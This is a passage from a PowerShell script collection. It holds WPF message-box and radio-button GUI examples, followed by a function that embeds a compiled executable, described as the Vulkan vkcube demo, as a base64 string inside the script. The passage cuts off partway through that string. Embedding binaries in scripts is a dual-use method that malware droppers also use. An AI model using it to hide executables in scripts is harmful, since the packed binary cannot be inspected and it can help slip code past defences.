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"
$CustomImage = New-Object System.Windows.Media.Imaging.BitmapImage
$CustomImage.BeginInit()
$CustomImage.StreamSource = [System.IO.MemoryStream][System.Convert]::FromBase64String($Base64)
$CustomImage.EndInit()

$Image = New-Object System.Windows.Controls.Image
$Image.Source = $CustomImage
$Image.Height = 512 #[System.Drawing.Image]::FromFile($CustomImage).Height / 2
$Image.Width = 512 #[System.Drawing.Image]::FromFile($CustomImage).Width / 2
 
$TextBlock = New-Object System.Windows.Controls.TextBlock
$TextBlock.Text = "My Logo"
$TextBlock.FontSize = "28"
$TextBlock.HorizontalAlignment = "Center"
 
$StackPanel = New-Object System.Windows.Controls.StackPanel
$StackPanel.AddChild($Image)
$StackPanel.AddChild($TextBlock)
 
New-WPFMessageBox -Content $StackPanel -Title "Messagebox with some logo" -TitleBackground LightSeaGreen -TitleTextForeground Black -ContentBackground LightSeaGreen

$ComputerName = "RandomPC"
Try
{
    New-PSSession -ComputerName $ComputerName -ErrorAction Stop
}
Catch
{
 
    # Create a text box
    $TextBox = New-Object System.Windows.Controls.TextBox
    $TextBox.Text = "Could not create a remote session to '$ComputerName'!"
    $TextBox.Padding = 5
    $TextBox.Margin = 5
    $TextBox.BorderThickness = 0
    $TextBox.FontSize = 16
    $TextBox.Width = "NaN"
    $TextBox.IsReadOnly = $True
 
    # Create an exander
    $Expander = New-Object System.Windows.Controls.Expander
    $Expander.Header = "Error details"
    $Expander.FontSize = 14
    $Expander.Padding = 5
    $Expander.Margin = "5,5,5,0"
 
    # Bind the expander width to the text box width, so the message box width does not change when expanded
    $Binding = New-Object System.Windows.Data.Binding
    $Binding.Path = [System.Windows.Controls.TextBox]::ActualWidthProperty
    $Binding.Mode = [System.Windows.Data.BindingMode]::OneWay
    $Binding.Source = $TextBox
    [void]$Expander.SetBinding([System.Windows.Controls.Expander]::WidthProperty,$Binding)
 
    # Create a textbox for the expander
    $ExpanderTextBox = New-Object System.Windows.Controls.TextBox
    $ExpanderTextBox.Text = "$_"
    $ExpanderTextBox.Padding = 5
    $ExpanderTextBox.BorderThickness = 0
    $ExpanderTextBox.FontSize = 16
    $ExpanderTextBox.TextWrapping = "Wrap"
    $ExpanderTextBox.IsReadOnly = $True
    $Expander.Content = $ExpanderTextBox
 
    # Assemble controls into a stackpanel
    $StackPanel = New-Object System.Windows.Controls.StackPanel
    $StackPanel.AddChild($TextBox)
    $StackPanel.AddChild($Expander)
 
    # Using no rounded corners as they do not stay true when the window resizes
    New-WPFMessageBox -Content $StackPanel -Title "PSSession Error" -TitleBackground Red -TitleFontSize 20 <# -Sound 'Windows Unlock' #> -CornerRadius 0



$Params = @{
    FontFamily = 'Arial'
    Title = ":("
    TitleFontSize = 80
    TitleTextForeground = 'White'
    TitleBackground = 'SteelBlue'
    ButtonType = 'OK'
    ContentFontSize = 16
    ContentTextForeground = 'White'
    ContentBackground = 'SteelBlue'
    ButtonTextForeground = 'White'
    BorderThickness = 0
}
New-WPFMessageBox @Params -Content "The script ran into a problem that it couldn't handle, and now it needs to exit. 
 
0x80050002

 See https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/ for more exmaples"


}
}

function func_wpf_routedevents2
{
#https://learn-powershell.net/2014/08/10/powershell-and-wpf-radio-button/

#https://gist.githubusercontent.com/SMSAgentSoftware/8331a70fac978e4c998bbc8fe34094bb/raw/88c2e4e7850cfd5177f76751f9b13cfc21db840e/New-CustomToastNotification.ps1

#Build the GUI
[xml]$xaml = @"
<Window 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    x:Name="Window" Title="Initial Window" WindowStartupLocation = "CenterScreen"
    SizeToContent = "WidthAndHeight" ShowInTaskbar = "True" Background = "red"> 
    <StackPanel x:Name='StackPanel'> 
        <RadioButton x:Name="Item1" Content = 'Item1'/>
        <RadioButton x:Name="Item2" Content = 'Item2'/>
        <RadioButton x:Name="Item3" Content = 'Item3'/>  
        <Separator/>
        <TextBox x:Name='textbox'/>      
    </StackPanel>
</Window>
"@
 
$reader=(New-Object System.Xml.XmlNodeReader $xaml)
$Window=[Windows.Markup.XamlReader]::Load( $reader )

$xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]") | ForEach {
    Set-Variable -Name ($_.Name) -Value $Window.FindName($_.Name) -Scope Script
}

#Bubble up event handler
[System.Windows.RoutedEventHandler]$Script:CheckedEventHandler = {
    $TextBox.Text = $_.source.name
}
$StackPanel.AddHandler([System.Windows.Controls.RadioButton]::CheckedEvent, $CheckedEventHandler)

$Window.Showdialog() | Out-Null
}

function func_embed-exe-in-psscript2
{
#https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts/

#Adapted a few lines so that it runs in PowerShell Core, search for lines that start with comment "ADAPTED TO PS7"

#Only works for 64-bit executables as only 64-bit pwsh.exe is installed....

#usage: wine powershell -f embedding-exe-files-into-powershell-scripts-example_vkcube.exe.ps1



function Convert-BinaryToString {
 
   [CmdletBinding()] param (
 
      [string] $FilePath
 
   )
 
   try {
 
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 
   }
 
   catch {
 
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 
   }
 
   if ($ByteArray) {
 
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
 
   }
 
   else {
 
      throw '$ByteArray is $null.';
 
   }
 
   Write-Output -InputObject $Base64String;
 
}
 # Below vkcube.exe as a Base64 encoded string; Included copyright below:
 # compiled for smaller size (after choco install mingw and choco install vulkan-sdk) with gcc -s -Os -fno-ident -fno-stack-protector -fomit-frame-pointer -fno-unwind-tables -fno-asynchronous-unwind-tables -falign-functions=1  -mpreferred-stack-boundary=4 -falign-jumps=1 -falign-loops=1 -I"..\Include"  .\cube.c "..\Lib\vulkan-1.lib" -lgdi32
 # and added two extra lines to cube.c : #define VK_USE_PLATFORM_WIN32_KHR and #define NDEBUG
 # Copyright (c) 2015-2019 The Khronos Group Inc.
 # Copyright (c) 2015-2019 Valve Corporation
 # Copyright (c) 2015-2019 LunarG, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
 # you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
 # distributed under the License is distributed on an "AS IS" BASIS,
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 #
 # Author: Jeremy Hayes <jeremy@lunarg.com>
 # Author: Charles Giessen <charles@lunarg.com>

$InputString='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